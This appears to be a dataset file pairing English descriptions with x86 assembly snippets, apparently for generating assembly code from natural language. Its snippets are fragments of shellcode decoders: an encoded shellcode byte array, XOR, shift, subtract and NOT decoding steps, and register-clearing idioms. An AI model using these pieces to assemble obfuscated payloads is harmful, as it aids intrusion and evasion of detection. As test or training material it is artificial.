"define shellcode as array of the bytes 0xf1,0x31,0x90,0x38,0x47,0x47,0x5c,0x1b,0x1b,0x47,0x4d,0x0b,0x07,0xe7,0x6a,0xb3,0xd9,0x6b,0xb1,0xda,0x68,0x51,0xbb,0xc6,0x4d",define shellcode array bytes var0,"shellcode : db 0xf1 , 0x31 , 0x90 , 0x38 , 0x47 , 0x47 , 0x5c , 0x1b , 0x1b , 0x47 , 0x4d , 0x0b , 0x07 , 0xe7 , 0x6a , 0xb3 , 0xd9 , 0x6b , 0xb1 , 0xda , 0x68 , 0x51 , 0xbb , 0xc6 , 0x4d","shellcode : db 0xf1 , 0x31 , 0x90 , 0x38 , 0x47 , 0x47 , 0x5c , 0x1b , 0x1b , 0x47 , 0x4d , 0x0b , 0x07 , 0xe7 , 0x6a , 0xb3 , 0xd9 , 0x6b , 0xb1 , 0xda , 0x68 , 0x51 , 0xbb , 0xc6 , 0x4d"
define shift_decode routine,define var0 routine,shift_decode :,var0 :
shift left 28 bits of eax,shift left 28 bits var0,"shl eax , 28","shl var0 , 28"
shift left the eax register by 28 bits,shift left var0 register 28 bits,"shl eax , 28","shl var0 , 28"
shift the ax register to right by one bit,shift ax register right one bit,"shr ax , 1","shr ax , 1"
shift right ax by the contents of cl and negate the word in ax,shift right ax contents cl and negate word ax,"shr ax , cl \n not word ax","shr ax , cl \n not word ax"
right shift the contents of bl by 4,right shift contents var0 4,"shr bl , 4","shr var0 , 4"
shift right dl by 1,shift right dl 1,"shr dl , 1","shr dl , 1"
shift right the dl register by 4 bits,shift right dl register 4 bits,"shr dl , 4","shr dl , 4"
shift right 24 of eax,shift right 24 var0,"shr eax , 24","shr var0 , 24"
shift right 28 of eax,shift right 28 var0,"shr eax , 28","shr var0 , 28"
define stage and call decoder function,define stage and call var0 function,stage : \n call decoder,stage : \n call var0
subtract 13 from the ax register,subtract 13 ax register,"sub ax , 13","sub ax , 13"
subtract the contents of al from the bl register,subtract contents al var0 register,"sub bl , al","sub var0 , al"
subtract the current byte of the shellcode from bl,subtract current byte shellcode var0,"sub bl , byte [esi]","sub var0 , byte [esi]"
subtract 8 from the byte in esi and then negate the result,subtract 8 byte var0 and then negate result,"sub byte [esi] , 8 \n not byte [esi]","sub byte [var0] , 8 \n not byte [var0]"
subtract the contents of dl from the cl register,subtract contents dl cl register,"sub cl , dl","sub cl , dl"
subtract al from dl and jump to decode_pr if the sign flag is zero,subtract al dl and jump var0 if sign flag zero,"sub dl , al \n jns decode_pr","sub dl , al \n jns var0"
subtract bx from dx,subtract var0 var1,"sub dx , bx","sub var1 , var0"
subtract 0x7f from the stack,subtract var0 stack,"sub esp , 0x7f","sub esp , var0"
subtract 0x7f from esp,subtract var0 esp,"sub esp , 0x7f","sub esp , var0"
define the switch function,define var0 function,switch :,var0 :
jump to even_number is the contents in esi is even,jump var0 contents var1 even,"test esi , 01h \n je even_number","test var1 , 01h \n je var0"
swap al value with next byte value (esi+1),swap al value next byte value (esi+1),"xchg byte [esi+1] , al","xchg byte [var0] , al"
perform xor between al and bl and jump short to shellcode if the result is zero,perform xor al and var0 and jump short shellcode if result zero,"xor al , bl \n jz short shellcode","xor al , var0 \n jz short shellcode"
perform xor between ax and 0x539 and store the result in ax,perform xor ax and var0 and store result ax,"xor ax , 0x539","xor ax , var0"
perform xor between ax and bx,perform xor ax and var0,"xor ax , bx","xor ax , var0"
perform xor between ax and bx and jump to call decoded if the result is zero,perform xor ax and var0 and jump call decoded if result zero,"xor ax , bx \n jz call_decoded","xor ax , var0 \n jz call_decoded"
perform the xor between bh and the byte in esi+edx,perform xor bh and byte esi+edx,"xor bh , byte [esi+edx]","xor bh , byte [var0]"
perform xor between bl and 0xaa and jump to encodedshellcode if the result is not zero,perform xor var0 and var1 and jump var2 if result not zero,"xor bl , 0xaa \n jne encodedshellcode","xor var0 , var1 \n jne var2"
perform xor between bl and 0xbb and jump to encoded if the result is zero,perform xor var0 and var1 and jump encoded if result zero,"xor bl , 0xbb \n jz encoded","xor var0 , var1 \n jz encoded"
perform the xor between bl and 0xbb and jump to formatting if it is zero else move the byte of the shellcode in cl,perform xor var0 and var1 and jump formatting if it zero else move byte shellcode cl,"xor bl , 0xbb \n jz formatting \n mov cl , byte [esi]","xor var0 , var1 \n jz formatting \n mov cl , byte [esi]"
perform the xor between bl and the byte in esi+edx,perform xor var0 and byte esi+edx,"xor bl , byte [esi+edx]","xor var0 , byte [var1]"
perform xor between bl and dl and jump short to shellcode if the result is not zero,perform xor var0 and dl and jump short shellcode if result not zero,"xor bl , dl \n jz short shellcode","xor var0 , dl \n jz short shellcode"
xor between the current byte in esi and 0x88,xor current byte var0 and var1,"xor byte [esi] , 0x88","xor byte [var0] , var1"
xor between current byte in esi and 0x97,xor current byte var0 and var1,"xor byte [esi] , 0x97","xor byte [var0] , var1"
perform the xor between the current byte of the shellcode and the dl register,perform xor current byte shellcode and dl register,"xor byte [esi] , dl","xor byte [esi] , dl"
perform the xor between the byte in esi and dl,perform xor byte var0 and dl,"xor byte [esi] , dl","xor byte [var0] , dl"
perform the xor between the current byte in esi and dl,perform xor current byte var0 and dl,"xor byte [esi] , dl","xor byte [var0] , dl"
perform the xor between the next byte of the shellcode and the dl register,perform xor next byte shellcode and dl register,"xor byte [esi+1] , dl","xor byte [esi+1] , dl"
perform the xor between ch and the byte in esi+edx,perform xor var0 and byte esi+edx,"xor ch , byte [esi+edx]","xor var0 , byte [var1]"
perform xor between cl and 0x32 and jump short to encodedshellcode is the result is zero,perform xor cl and var0 and jump short var1 result zero,"xor cl , 0x32 \n je short encodedshellcode","xor cl , var0 \n je short var1"
perform xor between cl and 0xaa and jump to next_cycle if the result is not zero,perform xor cl and var0 and jump var2 if result not zero,"xor cl , 0xaa \n jnz next_cycle","xor cl , var0 \n jnz var2"
perform xor between cl and 0xaa and jump to shift decode if the result is zero,perform xor cl and var0 and jump shift decode if result zero,"xor cl , 0xaa \n jz shift_decode","xor cl , var0 \n jz shift_decode"
perform the xor between cl and the byte in esi+edx,perform xor cl and byte esi+edx,"xor cl , byte [esi+edx]","xor cl , byte [var0]"
perform xor between dl and 0xbb and jump to next_cycle if the result is zero,perform xor dl and var0 and jump var2 if result zero,"xor dl , 0xbb \n jz next_cycle","xor dl , var0 \n jz var2"
clear the eax register and move 0x1 in the lowest byte of the register,clear var0 register and move var1 lowest byte register,"xor eax , eax \n mov al , 0x1","xor var0 , var0 \n mov al , var1"
clear the eax register and move 22 into the lower byte of the register,clear var0 register and move 22 lower byte register,"xor eax , eax \n mov al , 22","xor var0 , var0 \n mov al , 22"
clear the eax and the ebx registers,clear var0 and var1 registers,"xor eax , eax \n xor ebx , ebx","xor var0 , var0 \n xor var1 , var1"
"clear eax, ebx and ecx",clear var0 var1 and var2,"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx","xor var0 , var0 \n xor var1 , var1 \n xor var2 , var2"
"zero out eax, ebx, ecx and edx",zero out var0 var1 var2 and var3,"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx \n xor edx , edx","xor var0 , var0 \n xor var1 , var1 \n xor var2 , var2 \n xor var3 , var3"
"clear eax, ebx, ecx and edx registers",clear var0 var1 var2 and var3 registers,"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx \n xor edx , edx","xor var0 , var0 \n xor var1 , var1 \n xor var2 , var2 \n xor var3 , var3"
zero the value on ebp,zero value var0,"xor ebp , ebp","xor var0 , var0"
zero out the ebx register,zero out var0 register,"xor ebx , ebx","xor var0 , var0"
zero out the ebx register and move the next byte of the shellcode into the lower byte of the register,zero out var0 register and move next byte shellcode lower byte register,"xor ebx , ebx \n mov bl , [esi+1]","xor var0 , var0 \n mov bl , [esi+1]"
clear the ebx and edx registers,clear var0 and var1 registers,"xor ebx , ebx \n xor edx , edx","xor var0 , var0 \n xor var1 , var1"
clear ecx register,clear var0 register,"xor ecx , ecx","xor var0 , var0"
zero out the ecx register and move 0x19 into the lower byte of the register,zero out var0 register and move var1 lower byte register,"xor ecx , ecx \n mov cl , 0x19","xor var0 , var0 \n mov cl , var1"
clear the counter and move 0x1e into the first byte of the register,clear counter and move var0 first byte register,"xor ecx , ecx \n mov cl , 0x1e","xor ecx , ecx \n mov cl , var0"
zero out the ecx register and move 23 into the lower byte of the register,zero out var0 register and move 23 lower byte register,"xor ecx , ecx \n mov cl , 23","xor var0 , var0 \n mov cl , 23"
zero out the ecx register and move 25 in the lower 8 bits of the register,zero out var0 register and move 25 lower 8 bits register,"xor ecx , ecx \n mov cl , 25","xor var0 , var0 \n mov cl , 25"
zero out the loop counter and move shellcode_length in the first byte,zero out loop counter and move var0 first byte,"xor ecx , ecx \n mov cl , shellcode_length","xor ecx , ecx \n mov cl , var0"
trick to clear eax and ecx,trick clear var0 and var1,"xor ecx , ecx \n mul ecx","xor var1 , var1 \n mul var1"
cause both eax and edx to become zero,cause both var0 and var1 become zero,"xor ecx , ecx \n mul ecx","xor ecx , ecx \n mul ecx"
zero out eax and edx registers,zero out var0 and var1 registers,"xor ecx , ecx \n mul ecx","xor ecx , ecx \n mul ecx"
clear ecx and eax,clear var0 and var1,"xor ecx , ecx \n mul ecx","xor var0 , var0 \n mul var0"
"zero out the edi, eax, ebx and edx registers",zero out var0 var1 var2 and var3 registers,"xor edi , edi \n xor eax , eax \n xor ebx , ebx \n xor edx , edx","xor var0 , var0 \n xor var1 , var1 \n xor var2 , var2 \n xor var3 , var3"
clear the edx register and move the current byte of the shellcode into the lowest byte of the register,clear var0 register and move current byte shellcode lowest byte register,"xor edx , edx \n mov dl , [esi]","xor var0 , var0 \n mov dl , [esi]"
define xordecode,define var0,xordecode :,var0 :
